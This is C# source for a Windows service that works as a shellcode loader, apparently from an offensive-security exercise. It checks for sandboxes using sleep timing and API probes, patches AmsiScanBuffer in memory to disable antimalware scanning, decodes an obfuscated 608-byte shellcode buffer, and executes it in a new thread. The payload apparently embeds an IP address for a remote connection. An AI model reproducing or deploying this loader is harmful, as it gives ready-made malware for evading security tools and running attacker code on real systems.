using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType,
            UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }

            patch();

            byte[] buf = new byte[608] { 0x0d, 0x59, 0x94, 0xf5, 0x01, 0xf9, 0xdd, 0x11, 0x11, 0x11, 0x52, 0x62, 0x52, 0x61, 0x63, 0x62, 0x67, 0x59, 0x42, 0xe3, 0x76, 0x59, 0x9c, 0x63, 0x71, 0x59, 0x9c, 0x63, 0x29, 0x59, 0x9c, 0x63, 0x31, 0x59, 0x9c, 0x83, 0x61, 0x59, 0x20, 0xc8, 0x5b, 0x5b, 0x5e, 0x42, 0xda, 0x59, 0x42, 0xd1, 0xbd, 0x4d, 0x72, 0x8d, 0x13, 0x3d, 0x31, 0x52, 0xd2, 0xda, 0x1e, 0x52, 0x12, 0xd2, 0xf3, 0xfe, 0x63, 0x52, 0x62, 0x59, 0x9c, 0x63, 0x31, 0x9c, 0x53, 0x4d, 0x59, 0x12, 0xe1, 0x77, 0x92, 0x89, 0x29, 0x1c, 0x13, 0x20, 0x96, 0x83, 0x11, 0x11, 0x11, 0x9c, 0x91, 0x99, 0x11, 0x11, 0x11, 0x59, 0x96, 0xd1, 0x85, 0x78, 0x59, 0x12, 0xe1, 0x9c, 0x59, 0x29, 0x61, 0x55, 0x9c, 0x51, 0x31, 0x5a, 0x12, 0xe1, 0xf4, 0x67, 0x5e, 0x42, 0xda, 0x59, 0x10, 0xda, 0x52, 0x9c, 0x45, 0x99, 0x59, 0x12, 0xe7, 0x59, 0x42, 0xd1, 0x52, 0xd2, 0xda, 0x1e, 0xbd, 0x52, 0x12, 0xd2, 0x49, 0xf1, 0x86, 0x02, 0x5d, 0x14, 0x5d, 0x35, 0x19, 0x56, 0x4a, 0xe2, 0x86, 0xe9, 0x69, 0x55, 0x9c, 0x51, 0x35, 0x5a, 0x12, 0xe1, 0x77, 0x52, 0x9c, 0x1d, 0x59, 0x55, 0x9c, 0x51, 0x2d, 0x5a, 0x12, 0xe1, 0x52, 0x9c, 0x15, 0x99, 0x59, 0x12, 0xe1, 0x52, 0x69, 0x52, 0x69, 0x6f, 0x6a, 0x6b, 0x52, 0x69, 0x52, 0x6a, 0x52, 0x6b, 0x59, 0x94, 0xfd, 0x31, 0x52, 0x63, 0x10, 0xf1, 0x69, 0x52, 0x6a, 0x6b, 0x59, 0x9c, 0x23, 0xfa, 0x5c, 0x10, 0x10, 0x10, 0x6e, 0x59, 0x42, 0xec, 0x64, 0x5a, 0xcf, 0x88, 0x7a, 0x7f, 0x7a, 0x7f, 0x76, 0x85, 0x11, 0x52, 0x67, 0x59, 0x9a, 0xf2, 0x5a, 0xd8, 0xd3, 0x5d, 0x88, 0x37, 0x18, 0x10, 0xe6, 0x64, 0x64, 0x59, 0x9a, 0xf2, 0x64, 0x6b, 0x5e, 0x42, 0xd1, 0x5e, 0x42, 0xda, 0x64, 0x64, 0x5a, 0xcb, 0x4b, 0x67, 0x8a, 0xb8, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0xf9, 0x20, 0x11, 0x11, 0x11, 0x42, 0x4a, 0x43, 0x3f, 0x42, 0x47, 0x49, 0x3f, 0x45, 0x46, 0x3f, 0x42, 0x46, 0x43, 0x11, 0x6b, 0x59, 0x9a, 0xd2, 0x5a, 0xd8, 0xd1, 0xf4, 0x35, 0x11, 0x11, 0x5e, 0x42, 0xda, 0x64, 0x64, 0x7b, 0x14, 0x64, 0x5a, 0xcb, 0x68, 0x9a, 0xb0, 0xd7, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0xf9, 0x46, 0x11, 0x11, 0x11, 0x40, 0x6a, 0x58, 0x68, 0x86, 0x5b, 0x86, 0x74, 0x61, 0x78, 0x82, 0x41, 0x88, 0x88, 0x65, 0x59, 0x55, 0x67, 0x49, 0x42, 0x7e, 0x58, 0x62, 0x5f, 0x86, 0x5b, 0x65, 0x44, 0x5a, 0x42, 0x5c, 0x68, 0x56, 0x6a, 0x47, 0x86, 0x5d, 0x7e, 0x60, 0x5e, 0x45, 0x54, 0x70, 0x55, 0x42, 0x45, 0x7f, 0x80, 0x4a, 0x56, 0x83, 0x5b, 0x11, 0x59, 0x9a, 0xd2, 0x64, 0x6b, 0x52, 0x69, 0x5e, 0x42, 0xda, 0x64, 0x59, 0xc9, 0x11, 0x43, 0xb9, 0x95, 0x11, 0x11, 0x11, 0x11, 0x61, 0x64, 0x64, 0x5a, 0xd8, 0xd3, 0xfc, 0x66, 0x3f, 0x4c, 0x10, 0xe6, 0x59, 0x9a, 0xd7, 0x7b, 0x1b, 0x70, 0x59, 0x9a, 0x02, 0x7b, 0x30, 0x6b, 0x63, 0x79, 0x91, 0x44, 0x11, 0x11, 0x5a, 0x9a, 0xf1, 0x7b, 0x15, 0x52, 0x6a, 0x5a, 0xcb, 0x86, 0x57, 0xaf, 0x97, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0x5e, 0x42, 0xd1, 0x64, 0x6b, 0x59, 0x9a, 0x02, 0x5e, 0x42, 0xda, 0x5e, 0x42, 0xda, 0x64, 0x64, 0x5a, 0xd8, 0xd3, 0x3e, 0x17, 0x29, 0x8c, 0x10, 0xe6, 0x96, 0xd1, 0x86, 0x30, 0x59, 0xd8, 0xd2, 0x99, 0x24, 0x11, 0x11, 0x5a, 0xcb, 0x55, 0x01, 0x46, 0xf1, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0x59, 0x10, 0xe0, 0x85, 0x13, 0xfc, 0xbb, 0xf9, 0x66, 0x11, 0x11, 0x11, 0x64, 0x6a, 0x7b, 0x51, 0x6b, 0x5a, 0x9a, 0xe2, 0xd2, 0xf3, 0x21, 0x5a, 0xd8, 0xd1, 0x11, 0x21, 0x11, 0x11, 0x5a, 0xcb, 0x69, 0xb5, 0x64, 0xf6, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0x59, 0xa4, 0x64, 0x64, 0x59, 0x9a, 0xf8, 0x59, 0x9a, 0x02, 0x59, 0x9a, 0xeb, 0x5a, 0xd8, 0xd1, 0x11, 0x31, 0x11, 0x11, 0x5a, 0x9a, 0x0a, 0x5a, 0xcb, 0x23, 0xa7, 0x9a, 0xf3, 0x11, 0x11, 0x11, 0x11, 0x10, 0xe6, 0x59, 0x94, 0xd5, 0x31, 0x96, 0xd1, 0x85, 0xc3, 0x77, 0x9c, 0x18, 0x59, 0x12, 0xd4, 0x96, 0xd1, 0x86, 0xe3, 0x69, 0xd4, 0x69, 0x7b, 0x11, 0x6a, 0xcc, 0xf1, 0x2e, 0x3b, 0x1b, 0x52, 0x9a, 0xeb, 0x10, 0xe6 };

            //byte[] xorKey = new byte[5] { 0x70, 0x37, 0x51, 0x44, 0x6a };
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ xorKey[i % xorKey.Length]);
            //}

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

        protected override void OnStop()
        {
        }

        private static void patch()
        {
            IntPtr TargetDLL = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve pointer!");
                return;
            }

            IntPtr BufrPtr = GetProcAddress(TargetDLL, "Ams" + "iSc" + "anBu" + "ffer");
            if (BufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve function pointer!");
                return;
            }

            UIntPtr dwSize = (UIntPtr)3;
            uint Zero = 0;

            if (!VirtualProtect(BufrPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return;
            }
            Console.WriteLine("Success: We modified memory permissions!");

            byte[] p = new byte[12] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(12);

            Marshal.Copy(p, 0, unmanagedPointer, 12);

            MoveMemory(BufrPtr, unmanagedPointer, 12);

            if (!VirtualProtect(BufrPtr, dwSize, 0x20, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return;
            }
            Console.WriteLine("Success, function patched! :)");
            return;
        }
    }
}
